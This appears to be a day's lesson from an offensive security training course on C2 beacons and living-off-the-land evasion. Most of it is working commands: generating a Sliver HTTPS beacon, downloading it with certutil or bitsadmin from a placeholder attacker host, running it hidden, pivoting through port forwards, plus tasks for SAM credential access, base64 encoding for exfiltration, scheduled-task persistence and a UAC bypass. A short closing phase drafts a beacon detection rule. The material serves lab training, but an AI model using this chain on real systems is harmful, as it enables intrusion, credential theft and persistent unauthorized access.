---
title: "Infrastructure Practice Day 8 — C2 Beacon Management and LOLBins Evasion"
tags: [practice, C2, Sliver, beacon, LOLBins, evasion, LOLBAS, certutil,
       mshta, regsvr32, T1071, T1218, ATT&CK]
module: 04-BroadSurface-04
day: 253
related_topics:
  - C2 Concepts and Sliver Lab (Day 242)
  - Living off the Land (Day 243)
  - Infrastructure Practice Day 7 (Day 252)
  - Infrastructure Practice Day 9 (Day 254)
---

# Day 253 — Infrastructure Practice Day 8: C2 Beacon Management and LOLBins Evasion

> "A C2 framework is not a magic wand. You still have to know what to do
> once the beacon checks in. Today you combine both sides: use native tools
> to deliver and establish the beacon, then practise the commands you will
> run once you are inside. Speed and familiarity are what you are building."
>
> — Ghost

---

## Goals

By the end of today's session you will have:

1. Generated a Sliver HTTPS beacon and delivered it using only native Windows tools.
2. Managed multiple simultaneous beacon sessions.
3. Used native Windows utilities (LOLBins) to achieve at least 3 attacker goals.
4. Captured the network traffic from the beacon and identified C2 signatures.
5. Written one detection rule for your own beacon traffic.

**Time budget:** 5–6 hours.

---

## Phase 1 — Sliver Setup and Listener (Target: < 15 min)

```bash
# On attacker:
sliver-server &
sliver-client

# In Sliver shell:
https --lhost 0.0.0.0 --lport 443
jobs  # confirm listener running

# Generate Windows beacon:
generate beacon \
  --http https://<attacker-ip>:443 \
  --os windows \
  --arch amd64 \
  --format exe \
  --seconds 30 \
  --jitter 10 \
  --save /tmp/beacon.exe
# Serve it:
python3 -m http.server 8000 &
```

---

## Phase 2 — LOLBin Delivery (Target: < 10 min)

Deliver the beacon using only native Windows binaries — no Invoke-WebRequest:

```powershell
# Try at least two LOLBin delivery methods:

# Method A: certutil
certutil.exe -urlcache -split -f http://<attacker-ip>:8000/beacon.exe C:\Temp\svc.exe

# Method B: bitsadmin
bitsadmin /transfer SvcUpdate /download /priority FOREGROUND \
  http://<attacker-ip>:8000/beacon.exe C:\Temp\svc.exe

# Execute the beacon (backgrounded)
Start-Process C:\Temp\svc.exe -WindowStyle Hidden
```

```
[ ] Delivery method 1 used: ___
[ ] Delivery method 2 used: ___
[ ] Beacon executed
[ ] Check-in received in Sliver: Y / N
Time to first check-in: ___ seconds
```

---

## Phase 3 — Session Management and Commands

```
# In Sliver shell — practice all of these:
beacons              # list active beacons
use <beacon-id>      # interact

# Enumeration:
whoami
getpid
ps
netstat
ls C:\Users

# File operations:
download C:\Windows\System32\drivers\etc\hosts
upload /tmp/tool.exe C:\Temp\tool.exe

# Execute via shell:
execute -o cmd /c whoami /groups
execute -o powershell -c "Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '\"'}"

# Port forward for pivoting:
portfwd add --remote-addr 192.168.1.20 --remote-port 445 --local-port 10445
```

```
[ ] All basic commands executed successfully
[ ] File download tested
[ ] Port forward established
[ ] Second host accessible via port forward: Y / N
```

---

## Phase 4 — LOLBins Goals (no uploaded attacker tools allowed)

Using only Windows native tools (and the existing beacon for command execution),
achieve:

```
[ ] Goal 1: Read /etc/shadow equivalent (%SystemRoot%\System32\config\SAM)
    Method: ___

[ ] Goal 2: Encode sensitive data to base64 for exfiltration
    Method: certutil -encode ... OR powershell [Convert]::ToBase64String(...)

[ ] Goal 3: Create a scheduled task for persistence
    Method: schtasks /create ...

[ ] Goal 4: Attempt a UAC bypass using fodhelper or eventvwr
    Method: ___
    Result: ___
```

---

## Phase 5 — Traffic Analysis and Detection

```bash
# Capture beacon traffic during a 5-minute window
tcpdump -i any -w /tmp/beacon-traffic.pcap port 443 &
sleep 300
kill %1

# Analyse:
tshark -r /tmp/beacon-traffic.pcap -Y "ssl" \
  -T fields -e frame.time -e ip.src -e ip.dst -e frame.len | head -50

# Calculate inter-beacon interval:
tshark -r /tmp/beacon-traffic.pcap -Y "ssl.handshake" \
  -T fields -e frame.time | awk 'NR>1 {print $0 - prev} {prev=$0}'
```

Write a detection rule for the beacon interval you observed:

```yaml
title: Sliver Beacon — Regular 30s HTTPS Interval
# Fill in the detection condition based on what you observed:
detection:
  ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q253.1, Q253.2 …).

---

## Navigation

← Previous: [Day 252 — Infrastructure Practice Day 7](DAY-0252-Infrastructure-Practice-Day-7.md)
→ Next: [Day 254 — Infrastructure Practice Day 9](DAY-0254-Infrastructure-Practice-Day-9.md)
